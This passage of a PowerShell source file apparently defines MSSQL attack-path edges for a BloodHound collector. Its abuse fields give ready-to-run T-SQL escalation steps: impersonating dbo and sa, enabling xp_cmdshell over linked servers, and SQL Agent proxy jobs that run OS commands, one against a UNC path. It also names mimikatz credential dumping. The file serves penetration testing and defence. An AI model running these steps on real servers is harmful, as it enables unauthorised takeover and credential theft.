                            `   -- Grant the role CONTROL of the database `n
                            `   GRANT CONTROL TO [EvilRole];` `n
                            `   -- With CONTROL, we can impersonate dbo` `n
                            `   EXECUTE AS USER = 'dbo';` `n
                            `   	SELECT USER_NAME();` `n
                            `   	-- Now we can add ourselves to db_owner` `n
                            `   	EXEC sp_addrolemember 'db_owner', 'db_secadmin';` `n
                            `	    -- Or perform any other action in the database` `n
                            `   REVERT` "
            linuxAbuse = "Connect to the $($context.principal.SQLServerName) SQL server as a member of db_securityadmin (e.g., using impacket mssqlclient.py or proxied Windows tooling such as sqlcmd, mssql-cli, or SQL Server Management Studio) and execute the following SQL statements:`n
                                `USE $($context.targetPrincipal.Name);` `n
                            `   -- Create a role` `n
                            `   CREATE ROLE [EvilRole];` `n
                            `   -- Add self` `n
                            `   EXEC sp_addrolemember 'EvilRole', 'db_secadmin';` `n
                            `   -- Grant the role CONTROL of the database `n
                            `   GRANT CONTROL TO [EvilRole];` `n
                            `   -- With CONTROL, we can impersonate dbo` `n
                            `   EXECUTE AS USER = 'dbo';` `n
                            `   	SELECT USER_NAME();` `n
                            `   	-- Now we can add ourselves to db_owner` `n
                            `   	EXEC sp_addrolemember 'db_owner', 'db_secadmin';` `n
                            `	    -- Or perform any other action in the database` `n
                            `   REVERT` "
            opsec = "SQL Server logs certain security-related events to a trace log by default, but must be configured to forward them to a SIEM. The local log may roll over frequently on large, active servers, as the default storage size is only 20 MB. `n
                    Database role membership changes are logged by default. `n
                    To view database role membership change logs, execute: `n
                        `SELECT StartTime, LoginName + CASE WHEN EventClass = 110 THEN ' added ' WHEN EventClass = 111 THEN ' removed ' END + TargetUserName + CASE WHEN EventClass = 110 THEN ' to ' WHEN EventClass = 111 THEN ' from ' END + ObjectName + ' in database ' + DatabaseName AS Change FROM sys.fn_trace_gettable((SELECT CONVERT(NVARCHAR(260), value) FROM sys.fn_trace_getinfo(1) WHERE property = 2), DEFAULT) WHERE EventClass IN (110, 111) ORDER BY StartTime DESC;` "
            references = "- https://learn.microsoft.com/en-us/sql/relational-databases/security/authentication-access/database-level-roles?view=sql-server-ver17#fixed-database-roles `n
                        - https://learn.microsoft.com/en-us/sql/relational-databases/system-stored-procedures/sp-addrolemember-transact-sql?view=sql-server-ver17 `n
                        - https://learn.microsoft.com/en-us/sql/t-sql/statements/create-role-transact-sql?view=sql-server-ver17"
        }
    }   

    "MSSQL_HasDBScopedCred" = {
    #   Source and target node types
    #       MSSQL_Database          -> Base
    #   Requirements
    #       Database contains a database-scoped credential

        param($context)
        return @{
            traversable = if ($MakeInterestingEdgesTraversable) { $true } else { $false }
            general = "The database contains a database-scoped credential that authenticates as the target domain account when accessing external resources, although there is no guarantee the credentials are currently valid. Unlike server-level credentials, these are contained within the database and portable with database backups."
            windowsAbuse = "The credential could be crackable if it has a weak password and is used automatically when accessing external data sources from this database. Specific abuse for database-scoped credentials required further research."
            linuxAbuse = "The credential is used automatically when accessing external data sources from this database. Specific abuse for database-scoped credentials required further research."
            opsec = "Database-scoped credential usage is logged when accessing external resources. These credentials are included in database backups, making them portable. The credential secret is encrypted and cannot be retrieved directly."
            references = "- https://learn.microsoft.com/en-us/sql/t-sql/statements/create-database-scoped-credential-transact-sql?view=sql-server-ver17 `n 
                          - https://www.netspi.com/blog/technical-blog/network-pentesting/hijacking-sql-server-credentials-with-agent-jobs-for-domain-privilege-escalation/"
        }
    }

    "MSSQL_HasLogin" = {
    #   Source and target node types
    #       Base                    -> MSSQL_Login
    #       Group                   -> MSSQL_Login
    #   Requirements
    #       Domain account or group has a SQL login
    #       Login is enabled and has CONNECT SQL permission

        param($context)
        return @{
            traversable = $true
            general = "The domain account has a SQL Server login that is enabled and can connect to the SQL Server. This allows authentication to SQL Server using the account's credentials."
            windowsAbuse = "Connect to the $($context.principal.SQLServerName) SQL server and authenticate as $($context.targetPrincipal.Name) (e.g., using sqlcmd, SQL Server Management Studio, mssql-cli, or proxied Linux tooling such as impacket mssqlclient.py)"
            linuxAbuse = "Connect to the $($context.principal.SQLServerName) SQL server and authenticate as $($context.targetPrincipal.Name) (e.g., using impacket mssqlclient.py or proxied Windows tooling such as sqlcmd, mssql-cli, or SQL Server Management Studio)"
            opsec = "Windows authentication attempts are logged in SQL Server error logs for failed logins. Successful logins are not logged by default but can be enabled. Computer account authentication appears as DOMAIN\\COMPUTER$."
            references = "- https://learn.microsoft.com/en-us/sql/relational-databases/security/choose-an-authentication-mode?view=sql-server-ver17 `n
                        - https://learn.microsoft.com/en-us/sql/database-engine/configure-windows/server-properties-security-page?view=sql-server-ver17"
        }
    }    

    "MSSQL_HasMappedCred" = {
    #   Source and target node types
    #       MSSQL_Login             -> Base
    #   Requirements
    #       SQL login has a credential mapped via ALTER LOGIN ... WITH CREDENTIAL
    #   Notes
    #       Non-traversable because we can't determine validity (we could track tested accounts and use each to connect to SYSVOL, but this could still cause lockouts if run over and over again between valid attempts)

        param($context)
        return @{
            traversable = if ($MakeInterestingEdgesTraversable) { $true } else { $false }
            general = "This SQL login has a mapped credential that allows it to authenticate as the target domain account when accessing external resources outside of SQL Server, including over the network and at the host OS level. However, there is no guarantee the credentials are currently valid. SQL Server Agent must be running (could potentially be started via xp_cmdshell if service account has permission) and the login must have permission to add a credential proxy, grant the proxy access to a subsystem such as CmdExec or PowerShell, and add/start a job using the proxy to traverse this edge."
            windowsAbuse = "The credential could be crackable if it has a weak password and is used automatically when the login accesses certain external resources"
            linuxAbuse = " `-- SQL Server Agent must be running/started (or access box via xp_cmdshell first, then start, which requires admin)
                            
                            -- Server will validate creds before executing the job
                            CREATE CREDENTIAL MyCredential1
                            WITH IDENTITY = 'MAYYHEM\lowpriv',
                            SECRET = 'password';

                            EXEC msdb.dbo.sp_add_proxy 
                                @proxy_name = 'ETL_Proxy',
                                @credential_name = 'MyCredential1',
                                @enabled = 1;

                            -- 3. Grant proxy access to subsystems (CmdExec for OS commands)
                            EXEC msdb.dbo.sp_grant_proxy_to_subsystem 
                                @proxy_name = 'ETL_Proxy',
                                @subsystem_name = 'CmdExec';

                            -- 4. CREATE THE JOB FIRST
                            EXEC msdb.dbo.sp_add_job 
                                @job_name = N'MyJob',
                                @enabled = 1,
                                @description = N'Test job using proxy';

                            -- 5. Now add the job step that uses the proxy
                            EXEC msdb.dbo.sp_add_jobstep
                                @job_name = N'MyJob',
                                @step_name = N'Run Command as Proxy User',
                                @step_id = 1,
                                @subsystem = N'CmdExec',
                                @command = N'cmd /c ""\\10.4.10.254\\c""',
                                @proxy_name = N'ETL_Proxy';

                            -- Re-run
                            EXEC msdb.dbo.sp_start_job @job_name = N'MyJob';

                            -- 6. Add job to local server
                            EXEC msdb.dbo.sp_add_jobserver 
                                @job_name = N'MyJob',
                                @server_name = N'(local)';

                            -- 7. Execute the job immediately to test
                            EXEC msdb.dbo.sp_start_job @job_name = N'MyJob';` "
            opsec = "Credential usage is logged when accessing external resources. The actual credential password is encrypted and cannot be retrieved. Credential mapping changes are not logged in the default trace."
            references = "- https://learn.microsoft.com/en-us/sql/t-sql/statements/create-credential-transact-sql?view=sql-server-ver17 `n
                          - https://learn.microsoft.com/en-us/sql/relational-databases/security/authentication-access/credentials-database-engine?view=sql-server-ver17 `n 
                          - https://www.netspi.com/blog/technical-blog/network-pentesting/hijacking-sql-server-credentials-with-agent-jobs-for-domain-privilege-escalation/"
        }
    }

    "MSSQL_HasProxyCred" = {
    #   Source and target node types
    #       MSSQL_Login             -> Base
    #   Requirements
    #       Principal is authorized to use a SQL Agent proxy account

        param($context)
        return @{
            traversable = if ($MakeInterestingEdgesTraversable) { $true } else { $false }
            general = "The SQL principal is authorized to use SQL Agent proxy '$($context.proxyName)' that runs job steps as $($context.credentialIdentity). This proxy can be used with subsystems: $($context.subsystems). There is no guarantee the credentials are currently valid."
            windowsAbuse = "Create and execute a SQL Agent job using the proxy:`n
                                `-- Create job` `n
                                `EXEC msdb.dbo.sp_add_job @job_name = 'ProxyTest_$($context.proxyName)';` `n
                                `-- Add job step using proxy` `n
                                `EXEC msdb.dbo.sp_add_jobstep` `n
                                `   @job_name = 'ProxyTest_$($context.proxyName)',` `n
                                `   @step_name = 'RunAsProxy',` `n
                                `   @subsystem = '$(if ($context.subsystems -match 'CmdExec') { 'CmdExec' } elseif ($context.subsystems -match 'PowerShell') { 'PowerShell' } else { ($context.subsystems -split ',')[0].Trim() })',` `n
                                `   @command = '$(if ($context.subsystems -match 'CmdExec') { 'whoami > C:\\temp\\proxy_user.txt' } elseif ($context.subsystems -match 'PowerShell') { 'whoami | Out-File C:\\temp\\proxy_user.txt' } else { '-- Check subsystems for available options' })',` `n
                                `   @proxy_name = '$($context.proxyName)';` `n
                                `-- Execute job` `n
                                `EXEC msdb.dbo.sp_start_job @job_name = 'ProxyTest_$($context.proxyName)';` `n
                                `-- Check job status` `n
                                `EXEC msdb.dbo.sp_help_jobactivity @job_name = 'ProxyTest_$($context.proxyName)';` "
            linuxAbuse = "Create and execute a SQL Agent job using the proxy:`n
                                `-- Create job` `n
                                `EXEC msdb.dbo.sp_add_job @job_name = 'ProxyTest_$($context.proxyName)';` `n
                                `-- Add job step using proxy` `n
                                `EXEC msdb.dbo.sp_add_jobstep` `n
                                `   @job_name = 'ProxyTest_$($context.proxyName)',` `n
                                `   @step_name = 'RunAsProxy',` `n
                                `   @subsystem = '$(if ($context.subsystems -match 'CmdExec') { 'CmdExec' } elseif ($context.subsystems -match 'PowerShell') { 'PowerShell' } else { ($context.subsystems -split ',')[0].Trim() })',` `n
                                `   @command = '$(if ($context.subsystems -match 'CmdExec') { 'whoami > /tmp/proxy_user.txt' } elseif ($context.subsystems -match 'PowerShell') { 'whoami | Out-File /tmp/proxy_user.txt' } else { '-- Check subsystems for available options' })',` `n
                                `   @proxy_name = '$($context.proxyName)';` `n
                                `-- Execute job` `n
                                `EXEC msdb.dbo.sp_start_job @job_name = 'ProxyTest_$($context.proxyName)';` "
            opsec = "SQL Agent job execution is logged in msdb job history tables and Windows Application event log. The job runs as $($context.credentialIdentity). Proxy is $(if ($context.isEnabled) { 'ENABLED' } else { 'DISABLED - must be enabled before use' })."
            references = "- https://learn.microsoft.com/en-us/sql/ssms/agent/create-a-sql-server-agent-proxy?view=sql-server-ver17 `n
                          - https://learn.microsoft.com/en-us/sql/ssms/agent/use-proxies-to-run-jobs?view=sql-server-ver17 `n 
                          - https://www.netspi.com/blog/technical-blog/network-pentesting/hijacking-sql-server-credentials-with-agent-jobs-for-domain-privilege-escalation/"
        }
    }    
    
    "MSSQL_HostFor" = {
    #   Source and target node types
    #       Computer                -> MSSQL_Server
    #   Requirements
    #       Computer is the host machine for the SQL Server instance

        param($context)
        return @{
            traversable = $true
            general = "The computer $($context.principal.Name) hosts the target SQL Server instance $($context.targetPrincipal.Name)."
            windowsAbuse = "With admin access to the host, you can access the SQL instance: `n
                            If the SQL instance is running as a built-in account (Local System, Local Service, or Network Service), it can be accessed with a SYSTEM context with sqlcmd. `n
                            If the SQL instance is running in a domain service account context, the cleartext credentials can be dumped from LSA secrets with mimikatz `sekurlsa::logonpasswords`, then they can be used to request a service ticket for a domain account with admin access to the SQL instance. `n 
                            If there are no domain DBAs, it is still possible to start the instance in single-user mode, which allows any member of the computer's local Administrators group to connect as a sysadmin. WARNING: This is disruptive, possibly destructive, and will cause the database to become unavailable to other users while in single-user mode. It is not recommended."
            linuxAbuse = "If you have root access to the host, you can access SQL Server by manipulating the service or accessing database files directly."
            opsec = "Host access allows reading memory, modifying binaries, and accessing database files directly."
            references = "- https://learn.microsoft.com/en-us/sql/database-engine/configure-windows/configure-windows-service-accounts-and-permissions?view=sql-server-ver17 `n
                            - https://learn.microsoft.com/en-us/sql/database-engine/configure-windows/start-sql-server-in-single-user-mode?view=sql-server-ver17"
        }
    }

    "MSSQL_ImpersonateAnyLogin" = {
    # Server level
    #   Source and target node types
    #       MSSQL_Login             -> MSSQL_Server
    #       MSSQL_ServerRole        -> MSSQL_Server
    #   Requirements
    #       IMPERSONATE ANY LOGIN on the server object
    #   Default fixed roles with permission
    #       sysadmin (not drawing edge, included under ControlServer -> Contains[Login])
    
        param($context)
        return @{
            traversable = $true
            general = "The `IMPERSONATE ANY LOGIN` permission on the server object effectively grants the source $($context.principalNodeType) the ability to impersonate any server login."
            windowsAbuse = "Connect to the $($context.principal.SQLServerName) SQL server as $($context.principal.Name) (e.g., using sqlcmd, SQL Server Management Studio, mssql-cli, or proxied Linux tooling such as impacket mssqlclient.py) and execute the following SQL statement:`n
                                `EXECUTE AS LOGIN = 'sa'` `n
                                `   -- Now executing with sa privileges` `n
                                `   SELECT SUSER_NAME()` `n
                                `   -- Perform privileged actions here` `n
                                `REVERT ` "
            linuxAbuse = "Connect to the $($context.principal.SQLServerName) SQL server as $($context.principal.Name) (e.g., using impacket mssqlclient.py or proxied Windows tooling such as sqlcmd, mssql-cli, or SQL Server Management Studio) and execute the following SQL statement:`n
                                `EXECUTE AS LOGIN = 'sa'` `n
                                `   -- Now executing with sa privileges` `n
                                `   SELECT SUSER_NAME()` `n
                                `   -- Perform privileged actions here` `n
                                `REVERT ` "
            opsec = "SQL Server logs certain security-related events to a trace log by default, but must be configured to forward them to a SIEM. The local log may roll over frequently on large, active servers, as the default storage size is only 20 MB. Furthermore, the default trace log is deprecated and may be removed in future versions to be replaced permanently by Extended Events. `n                                            
                    Log events are not generated for login impersonation by default."
            references = "- https://learn.microsoft.com/en-us/sql/relational-databases/security/permissions-database-engine?view=sql-server-ver17#permissions-naming-conventions `n
                            - https://learn.microsoft.com/en-us/sql/t-sql/statements/execute-as-transact-sql?view=sql-server-ver17 `n
                            - https://learn.microsoft.com/en-us/sql/database-engine/configure-windows/default-trace-enabled-server-configuration-option?view=sql-server-ver17` "
        }
    } 

    "MSSQL_IsMappedTo" = {
    #   Source and target node types
    #       MSSQL_Login             -> MSSQL_DatabaseUser
    #   Requirements
    #       Server login is mapped to a database user (matching SIDs)

        param($context)
        return @{
            traversable = $true
            general = "The server login $($context.principal.Name) is mapped to the $($context.databaseName) database user $($context.targetPrincipal.Name)."
            windowsAbuse = "Connect as the login and use the database: `USE $($context.databaseName);` "
            linuxAbuse = "Connect as the login and use the database: `USE $($context.databaseName);` "
            opsec = "This is a static mapping. Actions are logged based on what the database user does."
            references = "- https://learn.microsoft.com/en-us/sql/relational-databases/security/authentication-access/create-a-database-user?view=sql-server-ver17"
        }
    }   

    "MSSQL_IsTrustedBy" = {
    # Database level
    #   Source and target node types
    #       MSSQL_Database          -> MSSQL_Server
    #   Requirements
    #       Database has TRUSTWORTHY ON
    #   Notes
    #       This edge represents that the server trusts this database to execute code at the server level
    #       Used in conjunction with MSSQL_ExecuteAsOwner for privilege escalation

        param($context)
        return @{
            traversable = if ($MakeInterestingEdgesTraversable) { $true } else { $false }
            general = "The database $($context.principal.Name) has the TRUSTWORTHY property set to ON. This means that SQL Server trusts this database, allowing code within it to execute with the privileges of the database owner at the server level."
            windowsAbuse = "This relationship may allow privilege escalation when combined with the ability to execute code within the database if the owner has high privileges at the server level. See MSSQL_ExecuteAsOwner edges from this database for exploitation paths."
            linuxAbuse = "This relationship enables privilege escalation when combined with the ability to execute code within the database if the owner has high privileges at the server level. See MSSQL_ExecuteAsOwner edges from this database for exploitation paths."
            opsec = "The TRUSTWORTHY property and database ownership are not typically monitored. Exploitation through CLR assemblies, stored procedures, or functions that use EXECUTE AS OWNER will not generate specific security events by default."
            references = "- https://learn.microsoft.com/en-us/sql/relational-databases/security/trustworthy-database-property?view=sql-server-ver17 `n
                        - https://docs.microsoft.com/en-us/sql/t-sql/statements/alter-database-transact-sql-set-options?view=sql-server-ver17"
        }
    }      

    "MSSQL_LinkedTo" = {
    #   Source and target node types
    #       MSSQL_Server            -> MSSQL_Server
    #   Requirements
    #       Source server has a linked server configuration to target

        param($context)
        return @{
            traversable = if ($MakeInterestingEdgesTraversable) { $true } else { $false }
            general = "The source SQL Server has a linked server connection to the target SQL Server. The actual privileges available through this link depend on the authentication configuration and remote user mapping."
            windowsAbuse = "Query the linked server: `SELECT * FROM [LinkedServerName].[Database].[Schema].[Table];` or execute commands: `EXEC ('sp_configure ''show advanced options'', 1; RECONFIGURE;') AT [LinkedServerName];` "
            linuxAbuse = "Query the linked server: `SELECT * FROM [LinkedServerName].[Database].[Schema].[Table];` or execute commands: `EXEC ('sp_configure ''show advanced options'', 1; RECONFIGURE;') AT [LinkedServerName];` "
            opsec = "Linked server queries are logged in the remote server's trace log as coming from the linked server login. Errors may reveal information about the remote server configuration."
            references = "- https://learn.microsoft.com/en-us/sql/relational-databases/linked-servers/linked-servers-database-engine?view=sql-server-ver17"
        }
    }

    "MSSQL_LinkedAsAdmin" = {
    #   Source and target node types
    #       MSSQL_Server            -> MSSQL_Server
    #   Requirements
    #       Linked server connection authenticates as sysadmin, securityadmin, CONTROL SERVER, or IMPERSONATE ANY LOGIN on target
    #           This could be nested -- the SQL login could be a member of a user-defined role (that could be a member of a role...) that is a member of securityadmin or has CONTROL SERVER/IMPERSONATE ANY LOGIN
    #       Target server has mixed mode authentication enabled
    #       Remote login is a SQL login (not Windows authentication)
    #       Enables full control of the remote SQL Server through linked server queries

        param($context)
        return @{
            traversable = $true
            general = "The source SQL Server has a linked server connection to the target with administrative privileges (sysadmin, securityadmin, CONTROL SERVER, or IMPERSONATE ANY LOGIN). This allows full control of the remote SQL Server including privilege escalation."
            windowsAbuse = "Execute commands with admin privileges on the linked server:`n
                                `-- Enable xp_cmdshell on remote server` `n
                                `EXEC ('sp_configure ''show advanced options'', 1; RECONFIGURE;') AT [LinkedServerName];` `n
                                `EXEC ('sp_configure ''xp_cmdshell'', 1; RECONFIGURE;') AT [LinkedServerName];` `n
                                `EXEC ('EXEC xp_cmdshell ''whoami'';') AT [LinkedServerName];` "
            linuxAbuse = "Execute commands with admin privileges on the linked server:`n
                                `-- Enable xp_cmdshell on remote server` `n
                                `EXEC ('sp_configure ''show advanced options'', 1; RECONFIGURE;') AT [LinkedServerName];` `n
                                `EXEC ('sp_configure ''xp_cmdshell'', 1; RECONFIGURE;') AT [LinkedServerName];` `n
                                `EXEC ('EXEC xp_cmdshell ''whoami'';') AT [LinkedServerName];` "
            opsec = "Linked server admin actions are logged on the remote server as coming from the linked server connection. Creating logins and adding to sysadmin generates event logs. Linked server queries may be logged differently than direct connections."
            references = "- https://learn.microsoft.com/en-us/sql/relational-databases/linked-servers/linked-servers-database-engine?view=sql-server-ver17 `n
                        - https://www.netspi.com/blog/technical-blog/network-penetration-testing/how-to-hack-database-links-in-sql-server/"
        }
    }    

    "MSSQL_MemberOf" = {
    #   Source and target node types
    #       MSSQL_Login             -> MSSQL_ServerRole
    #       MSSQL_ServerRole        -> MSSQL_ServerRole
    #       MSSQL_DatabaseUser      -> MSSQL_DatabaseRole
    #       MSSQL_DatabaseRole      -> MSSQL_DatabaseRole
    #       MSSQL_ApplicationRole   -> MSSQL_DatabaseRole
    #   Requirements
    #       Principal is a member of the target role
    #       Server roles cannot be added as members of sysadmin
    #       Fixed roles cannot be members of other fixed roles
    #       Application roles CAN be added to database roles via sp_addrolemember, although it can't be done via SSMS

        param($context)
        return @{
            traversable = $true
            general = "The $($context.principalNodeType) is a member of the $($context.targetPrincipalNodeType). This membership grants all permissions associated with the target role to the source principal."
            windowsAbuse = "When connected to the server/database as $($context.principal.Name), you have all permissions granted to the $($context.targetPrincipal.Name) role."
            linuxAbuse = "When connected to the server/database as $($context.principal.Name), you have all permissions granted to the $($context.targetPrincipal.Name) role."
            opsec = "Role membership is a static relationship. Actions performed using role permissions are logged based on the specific operation, not the role membership itself. `n
                    To view current role memberships at server level: `n
                        `SELECT `n
                        `    r.name AS RoleName,`n
                        `    m.name AS MemberName`n
                        `FROM sys.server_role_members rm`n
                        `JOIN sys.server_principals r ON rm.role_principal_id = r.principal_id`n
                        `JOIN sys.server_principals m ON rm.member_principal_id = m.principal_id`n
                        `ORDER BY r.name, m.name;` `n
                    To view current role memberships at database level: `n
                        `SELECT `n
                        `    r.name AS RoleName,`n
                        `    m.name AS MemberName`n
                        `FROM sys.database_role_members rm`n
                        `JOIN sys.database_principals r ON rm.role_principal_id = r.principal_id`n
                        `JOIN sys.database_principals m ON rm.member_principal_id = m.principal_id`n
                        `ORDER BY r.name, m.name;` "
            references = "- https://learn.microsoft.com/en-us/sql/relational-databases/security/authentication-access/server-level-roles?view=sql-server-ver17 `n
                        - https://learn.microsoft.com/en-us/sql/relational-databases/security/authentication-access/database-level-roles?view=sql-server-ver17 `n
                        - https://learn.microsoft.com/en-us/sql/relational-databases/system-catalog-views/sys-server-role-members-transact-sql?view=sql-server-ver17 `n
                        - https://learn.microsoft.com/en-us/sql/relational-databases/system-catalog-views/sys-database-role-members-transact-sql?view=sql-server-ver17"
        }
    }    
    
    "MSSQL_Owns" = {
    #   Source and target node types
    #       MSSQL_Login             -> MSSQL_Database
    #       MSSQL_Login             -> MSSQL_ServerRole
    #       MSSQL_DatabaseUser      -> MSSQL_DatabaseRole
    #       MSSQL_DatabaseRole      -> MSSQL_DatabaseRole
    #       MSSQL_ApplicationRole   -> MSSQL_DatabaseRole
    #   Requirements
    #       Principal owns the target object

        param($context)
        return @{
            traversable = $true
            general = "The $($context.principalNodeType) owns the $($context.targetPrincipalNodeType). Ownership provides full control over the object, including the ability to grant permissions, change properties, and in most cases, impersonate or control access."
            windowsAbuse = $(
                if ($context.targetPrincipalNodeType -eq "MSSQL_Database") {
                    "As the database owner, connect to the $($context.principal.SQLServerName) SQL server and execute:`n
                        `USE $($context.targetPrincipal.Name);` `n
                        `-- You have db_owner privileges in this database` `n
                        `-- Add users, grant permissions, modify objects, etc.` `n
                        `-- Examples:` `n
                        `CREATE USER [NewUser] FOR LOGIN [SomeLogin];` `n
                        `EXEC sp_addrolemember 'db_datareader', 'NewUser';` `n
                        `GRANT CONTROL TO [SomeUser];` "
                } elseif ($context.targetPrincipalNodeType -eq "MSSQL_ServerRole") {
                    "As the server role owner, connect to the $($context.principal.SQLServerName) SQL server and execute:`n
                        `-- Add members to the owned role` `n
                        `EXEC sp_addsrvrolemember 'target_login', '$($context.targetPrincipal.Name)';` `n
                        `-- Change role name` `n
                        `ALTER SERVER ROLE [$($context.targetPrincipal.Name)] WITH NAME = [NewName];` `n
                        `-- Transfer ownership` `n
                        `ALTER AUTHORIZATION ON SERVER ROLE::[$($context.targetPrincipal.Name)] TO [another_login];` "
                } elseif ($context.targetPrincipalNodeType -eq "MSSQL_DatabaseRole") {
                    "As the database role owner, connect to the $($context.principal.SQLServerName) SQL server and execute:`n
                        `USE $($context.databaseName);` `n
                        `-- Add members to the owned role` `n
                        `EXEC sp_addrolemember '$($context.targetPrincipal.Name)', 'target_user';` `n
                        `-- Change role name` `n
                        `ALTER ROLE [$($context.targetPrincipal.Name)] WITH NAME = [NewName];` `n
                        `-- Transfer ownership` `n
                        `ALTER AUTHORIZATION ON ROLE::[$($context.targetPrincipal.Name)] TO [another_user];` "
                } 
            )
            linuxAbuse = $(
                if ($context.targetPrincipalNodeType -eq "MSSQL_Database") {
                    "As the database owner, connect to the $($context.principal.SQLServerName) SQL server and execute:`n
                        `USE $($context.targetPrincipal.Name);` `n
                        `-- You have db_owner privileges in this database` `n
                        `-- Add users, grant permissions, modify objects, etc.` `n
                        `-- Examples:` `n
                        `CREATE USER [NewUser] FOR LOGIN [SomeLogin];` `n
                        `EXEC sp_addrolemember 'db_datareader', 'NewUser';` `n
                        `GRANT CONTROL TO [SomeUser];` "
                } elseif ($context.targetPrincipalNodeType -eq "MSSQL_ServerRole") {
                    "As the server role owner, connect to the $($context.principal.SQLServerName) SQL server and execute:`n
                        `-- Add members to the owned role` `n
                        `EXEC sp_addsrvrolemember 'target_login', '$($context.targetPrincipal.Name)';` `n
                        `-- Change role name` `n
                        `ALTER SERVER ROLE [$($context.targetPrincipal.Name)] WITH NAME = [NewName];` `n
                        `-- Transfer ownership` `n
                        `ALTER AUTHORIZATION ON SERVER ROLE::[$($context.targetPrincipal.Name)] TO [another_login];` "
                } elseif ($context.targetPrincipalNodeType -eq "MSSQL_DatabaseRole") {
                    "As the database role owner, connect to the $($context.principal.SQLServerName) SQL server and execute:`n
                        `USE $($context.databaseName);` `n
                        `-- Add members to the owned role` `n
                        `EXEC sp_addrolemember '$($context.targetPrincipal.Name)', 'target_user';` `n
                        `-- Change role name` `n
                        `ALTER ROLE [$($context.targetPrincipal.Name)] WITH NAME = [NewName];` `n
                        `-- Transfer ownership` `n
                        `ALTER AUTHORIZATION ON ROLE::[$($context.targetPrincipal.Name)] TO [another_user];` "
                } 
            )
            opsec = "Ownership relationships are static and actions taken as an owner are typically logged based on the specific action performed. Role membership changes are logged by default, but ownership transfers and role property changes may not be logged."
            references = "- https://learn.microsoft.com/en-us/sql/t-sql/statements/alter-authorization-transact-sql?view=sql-server-ver17 `n
                        - https://learn.microsoft.com/en-us/sql/relational-databases/system-stored-procedures/sp-addrolemember-transact-sql?view=sql-server-ver17 `n
                        - https://learn.microsoft.com/en-us/sql/relational-databases/system-stored-procedures/sp-addsrvrolemember-transact-sql?view=sql-server-ver17"
        }
    }

    "MSSQL_ServiceAccountFor" = {
    #   Source and target node types
    #       Base                    -> MSSQL_Server
    #   Requirements
    #       Account is configured as the SQL Server service account

        param($context)
        return @{
            traversable = if ($MakeInterestingEdgesTraversable) { $true } else { $false }
            general = "This domain account runs the SQL Server service."
            windowsAbuse = "The service account context determines SQL Server's access to network resources and local system privileges."
            linuxAbuse = "The service account context determines SQL Server's access to system resources and file permissions."
            opsec = "Service account changes require service restart and are logged in Windows event logs."
            references = "- https://learn.microsoft.com/en-us/sql/database-engine/configure-windows/configure-windows-service-accounts-and-permissions?view=sql-server-ver17"
        }
    }

    "MSSQL_TakeOwnership" = {
    # This one's weird because TAKE OWNERSHIP on the database itself does not allow the user to change the login that owns the database, but it allows the source principal to add members to any user-defined database role within that database. Note that only members of the db_owner fixed database role can add members to fixed database roles. This particular case is handled here for offensive case and via MSSQL_DBTakeOwnership for defensive case.

    # Offensive (non-traversable)
    #   Server level
    #       Source and target node types
    #           MSSQL_Login             -> MSSQL_ServerRole
    #           MSSQL_ServerRole        -> MSSQL_ServerRole
    #       Requirements
    #           SQL Server 2012 or higher (beginning of support for user-defined server roles)
    #           TAKE OWNERSHIP on a specific user-defined server role 
    #           User-defined roles only, fixed roles are not affected
    #   Database level
    #       Source and target node types
    #           MSSQL_DatabaseUser      -> MSSQL_Database
    #           MSSQL_DatabaseRole      -> MSSQL_Database
    #           MSSQL_ApplicationRole   -> MSSQL_Database
    #           MSSQL_DatabaseUser      -> MSSQL_DatabaseRole
    #           MSSQL_DatabaseRole      -> MSSQL_DatabaseRole
    #           MSSQL_ApplicationRole   -> MSSQL_DatabaseRole
    #       Requirements
    #           TAKE OWNERSHIP on a specific database securable 

        param($context)
        return @{
            traversable = $false
            general = "The source $($context.principalNodeType) can change the owner of this $($context.targetPrincipalNodeType) or descendent objects in its scope."
            windowsAbuse = "Connect to the $($context.principal.SQLServerName) SQL server as $($context.principal.Name) (e.g., using sqlcmd, SQL Server Management Studio, mssql-cli, or proxied Linux tooling such as impacket mssqlclient.py) and execute the following SQL statement:`n
                            $(if ($context.targetPrincipal.TypeDescription -eq 'SERVER_ROLE') {
                                "`ALTER AUTHORIZATION ON SERVER ROLE::[$($context.targetPrincipal.Name)] TO [login];` "
                            } elseif ($context.targetPrincipal.TypeDescription -eq 'DATABASE_ROLE') {
                                "`ALTER AUTHORIZATION ON ROLE::[$($context.targetPrincipal.Name)] TO [user];` "
                            })"
            linuxAbuse = "Connect to the $($context.principal.SQLServerName) SQL server as $($context.principal.Name) (e.g., using impacket mssqlclient.py or proxied Windows tooling such as sqlcmd, mssql-cli, or SQL Server Management Studio) and execute the following SQL statement:`n
                            $(if ($context.targetPrincipal.TypeDescription -eq 'SERVER_ROLE') {
                                "`ALTER AUTHORIZATION ON SERVER ROLE::[$($context.targetPrincipal.Name)] TO [login];` "
                            } elseif ($context.targetPrincipal.TypeDescription -eq 'DATABASE_ROLE') {
                                "`ALTER AUTHORIZATION ON ROLE::[$($context.targetPrincipal.Name)] TO [user];` "
                            })"
            opsec = "SQL Server logs certain security-related events to a trace log by default, but must be configured to forward them to a SIEM. The local log may roll over frequently on large, active servers, as the default storage size is only 20 MB. Furthermore, the default trace log is deprecated and may be removed in future versions to be replaced permanently by Extended Events. `n
                            Role ownership changes are not logged by default."
            references = "- https://learn.microsoft.com/en-us/sql/t-sql/statements/alter-server-role-transact-sql?view=sql-server-ver17#permissions `n
                          - https://learn.microsoft.com/en-us/sql/database-engine/configure-windows/default-trace-enabled-server-configuration-option?view=sql-server-ver17 `n
                          - https://learn.microsoft.com/en-us/sql/relational-databases/security/auditing/sql-server-audit-database-engine?view=sql-server-ver16"
            composition = "
                TODO"
        }
    }
}

# Helper function to check if a node already exists and merge properties
function Merge-NodeIfExists {
    param(
        [string]$Id,
        [hashtable]$NewProperties
    )
    
    $existingNode = $null
    
    if ($script:OutputFormat -eq "BloodHound") {
        $existingNode = $script:bloodhoundOutput.graph.nodes | Where-Object { $_.id -eq $Id } | Select-Object -First 1
        if (-not $existingNode) { return $false }
        
        $propsObj = $existingNode.properties
    } elseif ($script:OutputFormat -eq "BHGeneric") {
        $existingNode = $script:nodesOutput | Where-Object { $_.id -eq $Id } | Select-Object -First 1
        if (-not $existingNode) { return $false }
        
        $propsObj = $existingNode
    } else {
        return $false
    }
    
    # Merge properties
    foreach ($key in $NewProperties.Keys) {
        if ($null -eq $NewProperties[$key]) { continue }
        
        # For name property, prefer FQDN over IP
        if ($key -eq "name") {
            $isExistingIP = $propsObj.$key -match '^\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}$'
